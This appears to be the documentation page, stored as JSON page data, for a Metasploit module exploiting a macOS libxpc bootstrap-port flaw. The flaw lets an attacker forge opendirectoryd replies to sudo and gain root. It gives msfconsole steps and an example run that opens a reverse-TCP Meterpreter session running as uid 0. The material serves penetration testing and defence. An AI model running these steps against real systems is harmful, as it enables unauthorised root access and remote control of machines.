{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/osx/local/libxpc_mitm_ssudo","result":{"data":{"moduleMetadataJson":{"id":"cc88352e-21c7-5b6f-ad1a-4693d7d189c0","name":"Mac OS X libxpc MITM Privilege Escalation","fullname":"exploit/osx/local/libxpc_mitm_ssudo","description":"This module exploits a vulnerablity in libxpc on macOS <= 10.13.3\n        The task_set_special_port API allows callers to overwrite their bootstrap port,\n        which is used to communicate with launchd. This port is inherited across forks:\n        child processes will use the same bootstrap port as the parent.\n        By overwriting the bootstrap port and forking a child processes, we can now gain\n        a MitM position between our child and launchd.\n\n        To gain root we target the sudo binary and intercept its communication with\n        opendirectoryd, which is used by sudo to verify credentials. We modify the\n        replies from opendirectoryd to make it look like our password was valid.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/osx/local/libxpc_mitm_ssudo","documentationSlug":"/modules/documentation/exploit/osx/local/libxpc_mitm_ssudo","referencesSlug":"/modules/references/exploit/osx/local/libxpc_mitm_ssudo"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This vulnerability works against OSX &#x3C;= 10.13.3 (High Sierra). It has\nbeen tested against El Capitan (10.11), Sierra (10.12) and High Sierra,\nhowever it may work on older versions.</p>\n<p>The task<em>set</em>special_port API allows callers to overwrite their bootstrap port,\nwhich is used to communicate with launchd. This port is inherited across forks:\nchild processes will use the same bootstrap port as the parent.\nBy overwriting the bootstrap port and forking a child processes, we can now gain\na MitM position between our child and launchd.</p>\n<p>To gain root we target the sudo binary and intercept its communication with\nopendirectoryd, which is used by sudo to verify credentials. We modify the\nreplies from opendirectoryd to make it look like our password was valid.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get a session on a vulnerable system</li>\n<li><code class=\"language-text\">use exploit/osx/local/libxpc_mitm_ssudo</code></li>\n<li><code class=\"language-text\">set lhost &lt;IP&gt;</code></li>\n<li><code class=\"language-text\">set lport &lt;PORT&gt;</code></li>\n<li><code class=\"language-text\">set session &lt;session_id&gt;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"example-run\" style=\"position:relative;\"><a href=\"#example-run\" aria-label=\"example run permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Run</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; use exploit/osx/local/libxpc_mitm_ssudo\nmsf5 exploit(osx/local/libxpc_mitm_ssudo) &gt; set LHOST 192.168.0.2\nLHOST =&gt; 192.168.0.2\nmsf5 exploit(osx/local/libxpc_mitm_ssudo) &gt; set LPORT 4446\nLPORT =&gt; 4446\nmsf5 exploit(osx/local/libxpc_mitm_ssudo) &gt; set SESSION 1\nSESSION =&gt; 1\nmsf5 exploit(osx/local/libxpc_mitm_ssudo) &gt; exploit\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.0.2:4446\n[*] Uploading file: &#39;/tmp/romrvmmf&#39;\n[*] Uploading file: &#39;/tmp/kflrjdgv&#39;\n[*] Executing cmd &#39;/tmp/romrvmmf /tmp/kflrjdgv&#39;\n[*] Transmitting first stager...(210 bytes)\n[*] Transmitting second stager...(4088 bytes)\n[*] Sending stage (808168 bytes) to 192.168.0.2\n[*] Meterpreter session 2 opened (192.168.0.2:4446 -&gt; 192.168.0.2:50020) at 2018-11-20 16:08:05 +0800\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"cc88352e-21c7-5b6f-ad1a-4693d7d189c0"}}}